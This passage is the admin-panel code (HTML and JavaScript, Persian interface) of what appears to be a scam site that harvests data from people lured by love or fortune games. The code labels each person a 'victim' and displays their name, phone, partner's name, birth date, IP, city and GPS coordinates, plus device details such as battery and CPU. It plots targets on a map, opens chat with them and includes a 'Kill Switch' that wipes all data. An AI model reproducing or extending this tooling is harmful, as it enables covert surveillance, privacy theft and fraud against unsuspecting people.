.modal{position:fixed;inset:0;background:rgba(5,0,20,.98);z-index:99999;padding:20px;overflow-y:auto}
</style>
</head>
<body>
<div id="app">Loading...</div>
<div class="chatBox" id="chatBox">
<div class="chatHeader"><h3 id="chatTitle">چت</h3><button class="btn red" onclick="closeAdminChat()" style="padding:6px 12px">✕</button></div>
<div class="chatMessages" id="adminChatMessages"></div>
<div class="chatInput">
<input type="file" id="adminMediaInput" accept="image/*,audio/*,video/*" style="display:none" onchange="sendAdminMedia()">
<button class="btn" onclick="document.getElementById('adminMediaInput').click()">📎</button>
<input id="adminChatText" placeholder="پیام...">
<button class="btn" onclick="sendAdminChat()">📤</button>
</div>
</div>
<script>
const app=document.getElementById("app");
let currentChatSid="";
let currentChatLast=0;
let adminChatTimer=null;
let lastNotifyId=0;
let audioCtx=null;
function esc(s){return String(s??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}
function notifyNew(){try{if(navigator.vibrate)navigator.vibrate([200,100,200]);}catch(e){}try{if(!audioCtx)audioCtx=new(window.AudioContext||window.webkitAudioContext)();const o=audioCtx.createOscillator(),g=audioCtx.createGain();o.connect(g);g.connect(audioCtx.destination);o.frequency.value=880;g.gain.value=0.15;o.start();setTimeout(()=>o.stop(),200);}catch(e){}document.title="🔔 پیام جدید";}
async function checkLogin(){try{const r=await fetch("/admin/check");const j=await r.json();return j.ok;}catch(e){return false;}}
function showLogin(){app.innerHTML='<div class="loginBox"><h2 style="text-align:center;color:#b47aff;margin-bottom:20px">🔐 ورود</h2><input id="u" placeholder="نام کاربری"><input id="p" type="password" placeholder="رمز"><button class="btn" style="width:100%" onclick="doLogin()">ورود</button><p id="err" style="color:#f88;text-align:center;margin-top:10px"></p></div>';}
async function doLogin(){const u=document.getElementById("u").value;const p=document.getElementById("p").value;const r=await fetch("/admin/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u,password:p})});const j=await r.json();if(j.ok)showPanel();else document.getElementById("err").textContent="نام یا رمز اشتباه";}
async function showPanel(){
app.innerHTML='<h1>🕵 پنل مدیریت</h1>'
+'<button class="btn red" onclick="logout()">خروج</button>'
+'<button class="btn red" onclick="killAll()">💥 Kill Switch</button>'
+'<div class="card"><h3>📊 آمار</h3><div class="stats"><div class="stat"><b id="s-total">0</b>کل</div><div class="stat"><b id="s-online">0</b>آنلاین</div><div class="stat"><b id="s-phones">0</b>با شماره</div><div class="stat"><b id="s-subs">0</b>ارسال فرم</div></div></div>'
+'<div class="card"><h3>📈 کاربران ۱۴ روز</h3><canvas id="chart1"></canvas></div>'
+'<div class="card"><h3>🌍 کشورها</h3><canvas id="chart2"></canvas></div>'
+'<div class="card"><h3>🎮 بازی‌ها</h3><canvas id="chart3"></canvas></div>'
+'<div class="card"><h3>🗺️ نقشه‌ی کاربران</h3><div id="map"></div></div>'
+'<div class="card"><h3>👥 کاربران</h3><div id="users">...</div></div>';
loadStats();loadUsers();loadCharts();loadMap();
}
function logout(){fetch("/admin/logout",{method:"POST"}).then(()=>showLogin());}
async function killAll(){if(!confirm("همه پاک شه؟"))return;await fetch("/admin/kill",{method:"POST"});alert("پاک شد");}
async function loadStats(){try{const r=await fetch("/admin/stats").then(x=>x.json());document.getElementById("s-total").textContent=r.total||0;document.getElementById("s-online").textContent=r.online||0;document.getElementById("s-phones").textContent=r.phones||0;document.getElementById("s-subs").textContent=r.submissions||0;}catch(e){}}
async function loadUsers(){
try{
const r=await fetch("/admin/users-list").then(x=>x.json());
const box=document.getElementById("users");
if(!r.users||!r.users.length){box.innerHTML="<p>خالی</p>";return;}
let h="<table><tr><th>SID</th><th>اسم</th><th>شماره</th><th>عشق</th><th>چت</th><th>آخرین</th></tr>";
for(const v of r.users){
h+="<tr><td>"+esc((v.sid||"").slice(0,8))+"</td><td>"+esc(v.name||"-")+"</td><td>"+esc(v.phone||"-")+"</td><td>"+esc(v.lover||"-")+"</td><td>"+(v.chat_enabled?"🟢":"⚪")+"</td><td>"+esc((v.last_seen||"").slice(5,16))+"</td></tr>";
h+="<tr><td colspan='6' style='background:rgba(180,122,255,.05)'>";
h+="<button class='btn' onclick='viewDetail(\"" + esc(v.sid) + "\")'>📄</button>";
h+="<button class='btn green' onclick='toggleChat(\"" + esc(v.sid) + "\",1)'>💬 فعال</button>";
h+="<button class='btn red' onclick='toggleChat(\"" + esc(v.sid) + "\",0)'>🔒</button>";
h+="<button class='btn' onclick='setPass(\"" + esc(v.sid) + "\")'>🔑 رمز</button>";
h+="<button class='btn' style='background:#7a1aff' onclick='openChat(\"" + esc(v.sid) + "\")'>💭</button>";
h+="</td></tr>";
}
h+="</table>";
box.innerHTML=h;
}catch(e){}
}
async function viewDetail(sid){
const r=await fetch("/admin/user-detail?sid="+encodeURIComponent(sid)).then(x=>x.json());
let h='<div class="modal"><button class="btn red" onclick="this.parentElement.remove()">بستن</button>';
h+='<h2>📄 '+(sid||"").slice(0,8)+'</h2>';
if(r.victim){h+='<h3>اطلاعات پایه</h3><table>';for(const k of ["name","phone","lover","birth","niyat","ip","country","city","lat","lng","visits","first_seen","last_seen","ua"]){if(r.victim[k])h+='<tr><td>'+esc(k)+'</td><td>'+esc(r.victim[k])+'</td></tr>';}h+='</table>';}
if(r.full){h+='<h3>دستگاه</h3><table>';for(const k of ["model","os","browser","battery","charging","cpu","ram","gpu","connection","tz","lang","screen_w","screen_h"]){if(r.full[k])h+='<tr><td>'+esc(k)+'</td><td>'+esc(r.full[k])+'</td></tr>';}h+='</table>';}
if(r.submissions&&r.submissions.length){h+='<h3>سابقه</h3><table>';for(const s of r.submissions){h+='<tr><td>'+esc((s.at||"").slice(5,16))+'</td><td>'+esc(s.name||"-")+'</td><td>'+esc(s.phone||"-")+'</td></tr>';}h+='</table>';}
h+='</div>';
document.body.insertAdjacentHTML("beforeend",h);
}
async function toggleChat(sid,enabled){await fetch("/admin/chat-toggle",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid,enabled})});alert(enabled?"✅ فعال":"🔒 بسته");loadUsers();}
async function setPass(sid){const p=prompt("رمز چت:");if(!p)return;const r=await fetch("/admin/set-chat-password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid,password:p})});const j=await r.json();alert(j.ok?"✅ رمز: "+j.password:"❌");}
async function openChat(sid){
currentChatSid=sid;currentChatLast=0;
document.getElementById("chatBox").style.display="flex";
document.getElementById("chatTitle").textContent="چت با "+sid.slice(0,8);
document.getElementById("adminChatMessages").innerHTML="";
const r=await fetch("/admin/chat-history?sid="+encodeURIComponent(sid)).then(x=>x.json());
for(const m of (r.msgs||[])){if(m.id>currentChatLast)currentChatLast=m.id;addMsg(m.from_who,m.type,m.content,m.id);}
if(adminChatTimer)clearInterval(adminChatTimer);
adminChatTimer=setInterval(pollAdminChat,3000);
}
function closeAdminChat(){document.getElementById("chatBox").style.display="none";currentChatSid="";if(adminChatTimer)clearInterval(adminChatTimer);adminChatTimer=null;}
function addMsg(who,type,content,id){
const box=document.getElementById("adminChatMessages");
const d=document.createElement("div");
d.className="msg "+(who==="admin"?"admin":"user");
if(type==="photo")d.innerHTML="🖼 <img src='/media/"+id+"?sid="+currentChatSid+"&admin=1' style='max-width:200px;border-radius:8px'>";
else if(type==="audio")d.innerHTML="🎤 <audio controls src='/media/"+id+"?sid="+currentChatSid+"&admin=1'></audio>";
else if(type==="video")d.innerHTML="🎥 <video controls src='/media/"+id+"?sid="+currentChatSid+"&admin=1' style='max-width:200px'></video>";
else d.textContent=content;
box.appendChild(d);box.scrollTop=box.scrollHeight;
}
async function sendAdminChat(){const inp=document.getElementById("adminChatText");const txt=inp.value.trim();if(!txt||!currentChatSid)return;inp.value="";const box=document.getElementById("adminChatMessages");const d=document.createElement("div");d.className="msg admin";d.textContent="من: "+txt;box.appendChild(d);box.scrollTop=box.scrollHeight;await fetch("/admin/chat-send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid:currentChatSid,type:"text",content:txt})});}
async function sendAdminMedia(){const inp=document.getElementById("adminMediaInput");if(!inp.files.length||!currentChatSid)return;const file=inp.files[0];const type=file.type.startsWith("image")?"photo":file.type.startsWith("video")?"video":"audio";const reader=new FileReader();reader.onloadend=async()=>{await fetch("/admin/chat-send-media",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid:currentChatSid,type,data:reader.result})});};reader.readAsDataURL(file);inp.value="";}
async function pollAdminChat(){if(!currentChatSid)return;try{const r=await fetch("/admin/chat-history?sid="+encodeURIComponent(currentChatSid)+"&after="+currentChatLast).then(x=>x.json());for(const m of (r.msgs||[])){if(m.id>currentChatLast){currentChatLast=m.id;if(m.from_who==="user")addMsg(m.from_who,m.type,m.content,m.id);}}}catch(e){}}
async function loadCharts(){
try{const r=await fetch("/admin/stats-chart").then(x=>x.json());new Chart(document.getElementById("chart1"),{type:'line',data:{labels:r.days,datasets:[{label:'کاربران',data:r.counts,borderColor:'#b47aff',backgroundColor:'rgba(180,122,255,.2)',fill:true,tension:0.3}]},options:{plugins:{legend:{labels:{color:'#fff'}}},scales:{x:{ticks:{color:'#fff'}},y:{ticks:{color:'#fff'}}}}});new Chart(document.getElementById("chart2"),{type:'doughnut',data:{labels:r.countries.map(x=>x.country),datasets:[{data:r.countries.map(x=>x.c),backgroundColor:['#b47aff','#7a1aff','#ff69b4','#ff8800','#00aa66','#ffcc00','#00ccff','#ff3300']}]},options:{plugins:{legend:{labels:{color:'#fff'}}}}});}catch(e){}
try{const g=await fetch("/admin/games-chart").then(x=>x.json());new Chart(document.getElementById("chart3"),{type:'bar',data:{labels:g.games.map(x=>x.game),datasets:[{label:'بازی‌ها',data:g.games.map(x=>x.c),backgroundColor:'#b47aff'}]},options:{plugins:{legend:{labels:{color:'#fff'}}},scales:{x:{ticks:{color:'#fff'}},y:{ticks:{color:'#fff'}}}}});}catch(e){}
}
async function loadMap(){try{const map=L.map('map').setView([35.6892,51.389],4);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:18}).addTo(map);const r=await fetch("/admin/locations").then(x=>x.json());for(const u of r.users){if(u.lat&&u.lng)L.marker([u.lat,u.lng]).addTo(map).bindPopup(esc(u.name||"")+" — "+esc(u.phone||""));}}catch(e){}}
setInterval(async()=>{try{const r=await fetch("/admin/new-messages?last="+lastNotifyId).then(x=>x.json());if(r.count>0){lastNotifyId=r.last_id;notifyNew();}}catch(e){}},10000);
(async()=>{if(await checkLogin())showPanel();else showLogin();})();
</script>
</body>
</html>`;
